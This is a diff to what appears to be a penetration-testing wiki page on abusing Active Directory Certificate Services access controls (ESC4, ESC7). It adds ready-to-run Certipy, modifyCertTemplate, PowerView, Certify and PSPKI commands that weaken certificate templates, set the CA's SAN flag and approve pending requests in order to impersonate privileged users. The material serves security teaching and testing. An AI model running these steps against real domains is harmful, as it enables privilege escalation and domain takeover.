@@ -18,14 +18,53 @@ Active Directory Certificate Services add multiple objects to AD, including secu
 
 ## Practice
 
+{% hint style="info" %}
+Maliciously configuring a CA or a certificate template can be insufficient. A controlled AD object (user or computer) must also have the ability to request a certificate for that template. The controlled AD object must have `Certificate-Enrollment` rights over the enrollment services (i.e. CA) **and** over the certificate template ([source](https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/#section-2-2-3)).
+
+[PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)'s [Add-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/) function (in [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)) can be used to add `Certificate-Enrollment` rights to a "controlled AD object" over a specific template. In order to achieve this, the attacker needs to have enough rights (i.e. [`WriteDacl`](../access-controls/grant-rights.md)) over the certificate template.
+
+```powershell
+Add-DomainObjectAcl -TargetIdentity "target template" -PrincipalIdentity "controlled object" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=DOMAIN,DC=LOCAL" -Verbose
+```
+
+The example above shows how to edit a certificate template's DACL (requires [`WriteDacl`](../access-controls/grant-rights.md) over the template, i.e. [ESC4](access-controls.md#certificate-templates-esc4)), but modifying a CA's DACL follows the same principle (requires [`WriteDacl`](../access-controls/grant-rights.md) over the CA, i.e. [ESC7](access-controls.md#certificate-authority-esc7)).
+{% endhint %}
+
 ### Certificate templates (ESC4)
+
+In order to obtain an abusable template, some attributes and parameters need to be properly setup
+
+1. Get Enrollment rights for the vulnerable template
+2. Disable `PEND_ALL_REQUESTS` flag in `mspki-enrollment-flag` for disabling Manager Approval
+3. Set `mspki-ra-signature` attribute to `0` to disable Authorized Signature requirement
+4. Enable `ENROLLEE_SUPPLIES_SUBJECT` flag in `mspki-certificate-name-flag` to allow requesting users to specify another privileged account name as a SAN
+5. Set `mspki-certificate-application-policy` to a certificate purpose for authentication
+   1. Client Authentication (OID: `1.3.6.1.5.5.7.3.2`)
+   2. Smart Card Logon (OID: `1.3.6.1.4.1.311.20.2.2`)
+   3. PKINIT Client Authentication (OID: `1.3.6.1.5.2.3.4`)
+   4. Any Purpose (OID: `2.5.29.37.0`)
+   5. No EKU
+6. Request a certificate (with a high-privileged user's name set as SAN) for authentication and perform [Pass the Ticket](../kerberos/ptt.md).
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate these sensitive access control entries.
+From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate these sensitive access control entries, and [modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate) (Python) can be used to modify the template.
 
 ```python
+# 1. Enumerate sensitive access control entries
 certipy 'domain.local'/'user':'password'@'domaincontroller' find
+
+# 2. Disable Manager Approval Requirement
+modifyCertTemplate.py -template templateName -value 2 -property mspki-enrollment-flag domain.local/user:password
+
+# 3. Disable Authorized Signature Requirement
+modifyCertTemplate.py -template templateName -value 0 -property mspki-ra-signature domain.local/user:password
+
+# 4. Enable SAN Specification
+modifyCertTemplate.py -template templateName -add enrollee_supplies_subject -property msPKI-Certificate-Name-Flag domain.local/user:password
+
+# 5. Edit Certificate Application Policy Extension
+modifyCertTemplate.py -template templateName -value "'1.3.6.1.5.5.7.3.2', '1.3.6.1.5.2.3.4'" -property mspki-certificate-application-policy domain.local/user:password
 ```
 
 {% hint style="info" %}
@@ -34,16 +73,29 @@ By default, Certipy uses LDAPS, which is not always supported by the domain cont
 {% endtab %}
 
 {% tab title="Windows" %}
-From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used to enumerate these sensitive access control entries. At the time of writing (October 21st, 2021) [BloodHound](../../recon/bloodhound.md) doesn't support (yet) enumeration of these access controls.
+From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used to enumerate these sensitive access control entries. At the time of writing (October 21st, 2021) [BloodHound](../../recon/bloodhound.md) doesn't support (yet) enumeration of these access controls. [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) can be used to modify the template.
 
-```batch
+```powershell
+# 1. Enumerate sensitive access control entries
 Certify.exe find
+
+# 2. Disable Manager Approval Requirement
+Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity tempalteName -XOR @{'mspki-enrollment-flag'=2} -Verbose
+
+# 3. Disable Authorized Signature Requirement
+Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity templateName -Set @{'mspki-ra-signature'=0} -Verbose
+
+# 4. Enable SAN Specification
+Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity templateName -XOR @{'mspki-certificate-name-flag'=1} -Verbose
+
+# 5. Edit Certificate Application Policy Extension
+Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity templateName -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
 ```
 {% endtab %}
 {% endtabs %}
 
 {% hint style="warning" %}
-If sensitive access entries are identified, creativity will be the best ally. Not much public tooling is available at the time of writing (October 21st, 2021).
+If sensitive access entries are identified, creativity will be the best ally.&#x20;
 
 Currently, the best resources for manually abusing this are&#x20;
 
@@ -52,6 +104,8 @@ Currently, the best resources for manually abusing this are&#x20;
 {% endhint %}
 
 ### Certificate Authority (ESC7)
+
+#### ManageCA Rights
 
 {% tabs %}
 {% tab title="UNIX-like" %}
@@ -69,8 +123,71 @@ By default, Certipy uses LDAPS, which is not always supported by the domain cont
 {% tab title="Windows" %}
 From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used to enumerate info about the CAs, including access rights over the CA object.
 
-```batch
+Then, [PSPKI](https://github.com/PKISolutions/PSPKI) (PowerShell) can be used to modify the CA object ([RSAT](https://docs.microsoft.com/fr-fr/troubleshoot/windows-server/system-management-components/remote-server-administration-tools) is needed on the machine where PSPKI is run).
+
+```powershell
 Certify.exe cas
+
+# Install PSPKI
+Install-Module -Name PSPKI
+Import-Module PSPKI
+
+# Get the current value of EDITF_ATTRIBUTESUBJECTALTNAME2 and modify it with SetConfigEntry
+$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "CA.domain.local"
+$configReader.SetRootNode($true)
+$configReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
+$configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
+
+# Check after setting the flag (EDITF_ATTRIBUTESUBJECTALTNAME2 should appear in the output)
+certutil.exe -config "CA.domain.local\CA" -getreg "policy\EditFlags"
+```
+
+
+
+If RSAT is not present, it can installed like this:
+
+```batch
+DISM.exe /Online /Get-Capabilities
+DISM.exe /Online /add-capability /CapabilityName:Rsat.CertificateServices.Tools~~~~0.0.1.0
+```
+{% endtab %}
+{% endtabs %}
+
+#### ManageCertificates Rights
+
+{% tabs %}
+{% tab title="First Tab" %}
+From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate access rights over the CA object.
+
+```python
+certipy 'domain.local'/'user':'password'@'domaincontroller' find
+```
+
+{% hint style="info" %}
+By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
+{% endhint %}
+{% endtab %}
+
+{% tab title="Windows" %}
+From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used to enumerate info about the CAs, including access rights over the CA object, and to request a certificate that requires manager approval.
+
+Then, [PSPKI](https://github.com/PKISolutions/PSPKI) (PowerShell) can be used to approve a certificate request ([RSAT](https://docs.microsoft.com/fr-fr/troubleshoot/windows-server/system-management-components/remote-server-administration-tools) is needed on the machine where PSPKI is used). PSPKI is a PowerShell module used to "simplify various PKI and AD CS management tasks".
+
+```powershell
+# 1. Request a certificate that requires manager approval with Certify
+Certify.exe request /ca:CA.domain.local\CA /template:ApprovalNeeded
+...
+[*] Request ID : 1
+
+# 2. Install PSPKI on a controlled Windows host
+Install-Module -Name PSPKI
+Import-Module PSPKI
+
+# 3. Approve the pending request with PSPKI
+PSPKI > Get-CertificationAuthority -ComputerName CA.domain.local | Get-PendingRequest -RequestID 1 | Approve-CertificateRequest
+
+# 4. Download the certificate with Certify
+Certify.exe download /ca:CA.domain.local\CA /id:1
 ```
 {% endtab %}
 {% endtabs %}
@@ -83,6 +200,7 @@ Currently, the best resources for manually abusing this are&#x20;
 * [the whitepaper](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf) (PDF)
 * [Abusing weak ACL on Certificate Templates (by daemon0cc0re)](https://github.com/daem0nc0re/Abusing\_Weak\_ACL\_on\_Certificate\_Templates)
 * [AD-CS The Certified Pre Owned Attacks (by HTTP418)](https://http418infosec.com/ad-cs-the-certified-pre-owned-attacks#esc4)
+* [AD CS Abuse (by snovvcrash)](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse#vulnerable-ca-aces-esc7)
 {% endhint %}
 
 ### Other objects (ESC5)
